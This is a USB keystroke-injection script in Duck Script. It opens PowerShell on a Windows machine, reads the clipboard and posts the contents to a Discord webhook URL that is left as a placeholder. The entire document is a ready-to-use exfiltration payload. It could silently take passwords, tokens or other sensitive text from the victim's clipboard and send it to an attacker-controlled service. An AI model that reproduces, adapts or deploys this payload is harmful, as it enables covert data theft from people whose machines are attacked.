REM ============================================
REM Duck Script - Send clipboard content to Discord
REM ============================================

DELAY 1000
GUI r
DELAY 200
STRING powershell
ENTER
DELAY 1000

REM Get the clipboard contents
STRING $c = Get-Clipboard -Raw
ENTER
DELAY 500

REM Set the webhook URL (REPLACE with your new one)
STRING $u = 'YOUR_DISCORD_WEBHOOK_HERE'
ENTER
DELAY 500

REM Build the compressed JSON
STRING $b = @{ content = $c } | ConvertTo-Json -Depth 1 -Compress
ENTER
DELAY 500

REM Convert to UTF-8 bytes
STRING $bytes = [System.Text.Encoding]::UTF8.GetBytes($b)
ENTER
DELAY 500

REM Send the request
STRING Invoke-RestMethod -Uri $u -Method Post -Body $bytes -ContentType 'application/json'
ENTER
DELAY 2000

REM Close PowerShell (optional - comment out if you want to see the result)
REM STRING exit
REM ENTER
